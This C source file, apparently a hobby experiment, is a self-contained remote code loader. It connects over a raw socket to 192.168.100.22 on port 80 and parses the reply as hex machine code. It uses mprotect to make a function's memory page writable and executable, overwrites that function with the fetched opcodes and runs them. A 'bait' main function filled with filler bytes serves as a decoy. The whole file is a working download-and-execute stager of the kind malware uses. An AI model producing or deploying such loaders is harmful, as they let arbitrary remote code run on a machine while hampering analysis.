#include "syscalls.h"

#define PROT_READ       0x1
#define PROT_WRITE      0x2
#define PROT_EXEC       0x4

#define ASM_SPAWN_ILL(nop_bytes)            { __asm__ volatile (".rept %c0; .byte 0xff; .endr;" :: "i"(nop_bytes)); }
#define ASM_SPAWN_BYTE(n_bytes, hexbyte)    { __asm__ volatile (".rept %c0; .byte %c1; .endr;"  :: "i"(n_bytes), "i"(hexbyte)); }
#define ASM_SPAWN_TRAP()                    { __asm__ volatile ("int3;"); }

#define PAGE_SIZE       4096

#define BYTECODE_MAX    256

#define ESOCKET         2                   /* net failure */
#define EINPUT          3                   /* corrupted remote data */
#define EMPROTECT       4                   /* mprotect unlock failure */
#define EREAD           5                   /* error reading socket fd */
#define ESOCKSEND       6                   /* socket sendto error */
#define ESOCKRECV       7                   /* socket recvfrom error */
#define ECLOSE          8                   /* error closing socket fd */
#define ESHUTDOWN       9                   /* UNUSED - connection shutdown error */

#define BSWAP16(x) ((uint16) ((((x) >> 8) & 0xff) | (((x) & 0xff) << 8)))

/* Little helper buddies */
uint x_strlen(const char *str) {
    if (str == NULL) { return 0; }

    if (*str == 0) { return 0; }
    
    uint len_counter = 1;
    while(*(str + len_counter) != '\0') {
        if (len_counter < UINT_MAX) {
            len_counter++;
        } else { break; }
    }

    return len_counter;
}

size_t x_memcpy(void *destination, const void *source, size_t nbytes) {
    if (destination == NULL || source == NULL || nbytes == 0) {
        return 0;
    }

    size_t i = 0;
    for (i = 0; i < nbytes; i++) {
        *(uchar *) (destination + i) = *(uchar *) (source + i);
    }

    return i;
}

int x_ctoi(char c) { 
    if (c > 57 || c < 48) { return -EXIT_FAILURE; }
    return c - 48; 
}

int char2int(byte input) {
    if(input >= '0' && input <= '9') { return input - '0'; }
    if(input >= 'A' && input <= 'F') { return input - 'A' + 10; }
    if(input >= 'a' && input <= 'f') { return input - 'a' + 10; }
    ASM_SPAWN_TRAP();
}

size_t hex2bin(const byte* src, size_t len, byte* target) {
    size_t i = 0, cnt = 0;
    while(*src && src[1] && cnt < len) {
        *(target++) = char2int(*src)*16 + char2int(src[1]);
        src += 2;
        cnt += 2;
        i++;
    }
    return i;
}

uint64 x_atou64(const char *input, size_t *maxlen) {
    if (NULL == input) { return 0; }
    size_t slen;
    if (maxlen != NULL) {
        slen = *maxlen;
    } else {
        slen = x_strlen(input);
    }
    
    slen = (slen <= 19) ? slen : 19;
    
    uint64 result = 0;

    for (size_t i = 0; i < slen; i++) {
        int cint = 0;
        
        /* if x_ctoi() returns error, don't add nothing */
        cint = x_ctoi(input[i]);
        if (cint != - EXIT_FAILURE) {
            result += cint;
            if (i < slen - 2) { result *= 10; }
        }
    }

    if (result == 0) {
        /* error */
        ASM_SPAWN_TRAP();
    }
    return result;
}

/**
 * @brief This is the functio we will be writing to.
 * I only named it malloc for fun, it has nothing to with memory allocation at all.
 */
int _malloc(void);


/**
 * @brief Makeshift netcomm. Equivalent to building a house with wooden sticks and glue.
 * 
 * @param outbuf output buffer will hold received data
 * @param buflen outbuf length
 * @return int 
 */
int read_remote_bytes(byte *outbuf, size_t buflen) {
    if (NULL == outbuf) { return EXIT_FAILURE; }
    int socket_fd = -1;
    struct sockaddr_in server;
    char *message, server_reply[2048];
    char bodybuf[256] = { 0 };
    size_t recvlen = 0;

    socket_fd = x_sys_socket(AF_INET, SOCK_STREAM, 0);

    if (socket_fd == -EXIT_FAILURE) { return EXIT_FAILURE; }

    server.sin_addr.s_addr = 0x1664a8c0;    /* 192.168.100.22 */
    server.sin_family = AF_INET;
    server.sin_port = BSWAP16(0x0050);      /* 80 */

    if (x_sys_connect(socket_fd, (const struct sockaddr *) &server, sizeof(server)) < EXIT_SUCCESS) {
        return EXIT_FAILURE;
    }

    message = "GET /index\r\n\r\n";
    if (x_sys_sendto(socket_fd, message, x_strlen(message), 0, NULL, 0) < EXIT_SUCCESS) {
        return ESOCKSEND;
    }

    if (x_sys_recvfrom(socket_fd, server_reply, sizeof(server_reply) - 1, 0, NULL, NULL ) < EXIT_SUCCESS) {
        return ESOCKRECV;
    }

    if (x_sys_read(socket_fd, bodybuf, sizeof(bodybuf) - 1) < EXIT_SUCCESS) {
        return EREAD;
    }

    x_sys_shutdown(socket_fd, SHUT_RDWR);
    if (x_sys_close(socket_fd) != EXIT_SUCCESS) {
        return ECLOSE;
    }

    recvlen = x_strlen(bodybuf);
    x_memcpy(outbuf, bodybuf, (recvlen <= buflen) ? recvlen : buflen);

    return EXIT_SUCCESS;
}

int _start(void) {
    byte opcodes_hex[BYTECODE_MAX];                     /* holds machine code to be written */
    byte remote_opcodes[BYTECODE_MAX + BYTECODE_MAX];   /* holds ascii representation of opcodes to be converted */
    byte data_bytes[BYTECODE_MAX];                      /* data to be printed out */
    byte addr_flag[8] = { 0xff, 0xff, 0xff, 0xff, 0x77, 0x77, 0x77, 0x77 };
    byte addr_fmtb[8] = { 0 };
    size_t data_size_index = 3; 

    byte *fmtptr = NULL;                                /* formatting index */
    byte *addrptr = NULL;                               /* pointer to printout address buffer in opcode bytes */
    byte *dataptr = NULL;                               /* pointer to memory where data is written */

    int netret = EXIT_SUCCESS;
    if ((netret = read_remote_bytes(remote_opcodes, sizeof(remote_opcodes))) != EXIT_SUCCESS) {
        x_sys_exit(netret);
    }

    int ret = 0xF;
    byte *rptr = (byte *) &_malloc;

    uintptr aladdr = (uintptr) &_malloc;
    /* page boundary alignment (addr x remainder) */
    aladdr -= (uintptr) &_malloc % PAGE_SIZE;
    if ((ret = x_sys_mprotect(aladdr, BYTECODE_MAX, PROT_READ | PROT_WRITE | PROT_EXEC)) != EXIT_SUCCESS) {
        x_sys_exit(EMPROTECT);
    }

    /* 2 * 5 * 6 (BYTECODE_MAX) */
    off_t data_len = x_atou64(remote_opcodes, &data_size_index);
    if (data_len == 0) { x_sys_exit(EINPUT); }

    /* skip to machine code */
    fmtptr = &remote_opcodes[3 + data_len];

    /* flag character for input validation */
    if (*fmtptr != 'x') { x_sys_exit(EINPUT); }
    fmtptr += (byte) 1;

    /* convert ascii to bytes and calculate number of opcodes */
    size_t nbytes = hex2bin(fmtptr, x_strlen(fmtptr), opcodes_hex);
    /* rewind back to data bytes */
    fmtptr = &remote_opcodes[3];

    /* convert data bytes */
    hex2bin(fmtptr, data_len, data_bytes);

    /* find data address */
    for (uint i = 0; i < nbytes; i++) {
        if (opcodes_hex[i] == 0xff) {
            for (uint j = 1; j < 8; j++) {
                if (opcodes_hex[i + j] != addr_flag[j]) { break; }
                if (j == 7) { addrptr = &opcodes_hex[i]; }
            }
        }
    }
    /* load data address to buffer */
    uintptr data_start_address = (uintptr) &_malloc + nbytes;
    x_memcpy(addr_fmtb, &data_start_address, sizeof(uintptr));
    for (uint i = 0; i < sizeof(addr_fmtb); i++) {
        addrptr[i] = addr_fmtb[i];
    }

    /* write opcodes first */
    for (uint i = 0; i < nbytes; i++) {
        *(rptr + i) = opcodes_hex[i];
    }

    /* now write data for printout */
    dataptr = (byte *) data_start_address;
    for (uint i = 0; i < data_len; i++) {
        dataptr[i] = data_bytes[i];
    }

    _malloc();

    x_sys_exit(EXIT_SUCCESS);
}

int _malloc(void) {
    ASM_SPAWN_ILL(BYTECODE_MAX);
}

/* bait function, pointless af */
int main(void) {
    ASM_SPAWN_ILL(1);
    ASM_SPAWN_BYTE(BYTECODE_MAX - 1, 0xb8);
    ASM_SPAWN_TRAP();
}